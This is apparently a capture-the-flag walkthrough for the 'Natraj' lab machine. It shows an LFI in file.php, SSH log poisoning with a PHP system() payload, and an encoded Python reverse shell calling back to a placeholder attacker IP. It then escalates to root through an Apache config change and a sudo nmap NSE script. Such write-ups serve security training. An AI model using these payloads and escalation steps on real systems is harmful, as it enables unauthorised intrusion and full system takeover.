# Natraj: Machine Notes

## Recon

### Nmap
- Port 22/tcp: SSH (OpenSSH 7.6p1)
- Port 80/tcp: HTTP (Apache 2.4.29)

### Web Enumeration
- Directory: `/console/` (Listable)
- Directory: `/images/` (Listable)
- Found `http://192.168.246.80/console/file.php`.

## Initial Access

### LFI Discovery
- The `file` parameter in `file.php` is vulnerable to Local File Inclusion.
```bash
curl -s "http://192.168.246.80/console/file.php?file=/etc/passwd"
```

### Log Poisoning (RCE)
- Found `/var/log/auth.log` is readable via LFI.
- Poison the log by attempting to log in via SSH with a PHP payload as the username:
```bash
ssh '<?php system($_GET["cmd"]); ?>'@192.168.246.80
```
- Access the RCE via LFI:
```bash
curl "http://192.168.246.80/console/file.php?file=/var/log/auth.log&cmd=id"
```

### Reverse Shell
- Use a Python reverse shell payload:
```bash
curl "http://192.168.246.80/console/file.php?file=/var/log/auth.log&cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22[KALI_IP]%22%2C4445%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27"
```

## Privilege Escalation

### Phase 1: www-data to mahakal
- `sudo -l` for `www-data`:
  - `(ALL) NOPASSWD: /bin/systemctl start apache2`
  - `(ALL) NOPASSWD: /bin/systemctl stop apache2`
  - `(ALL) NOPASSWD: /bin/systemctl restart apache2`
- Abuse: Modify `/etc/apache2/apache2.conf` (or similar writable config) to run Apache as the user `mahakal`.
- Edit `apache2.conf`:
```conf
User mahakal
Group mahakal
```
- Restart Apache:
```bash
sudo /bin/systemctl restart apache2
```
- Trigger the reverse shell again (now running as `mahakal`).

### Phase 2: mahakal to root
- `sudo -l` for `mahakal`:
  - `(root) NOPASSWD: /usr/bin/nmap`
- Abuse: Use Nmap scripting engine (NSE) to execute bash.
- Create NSE script `/tmp/root.nse`:
```lua
local os = require "os"
prerule = function() return true end
action = function() os.execute("/bin/bash") end
```
- Execute Nmap with the script:
```bash
sudo nmap --script=/tmp/root.nse 127.0.0.1
```
- Result: **Root shell**.
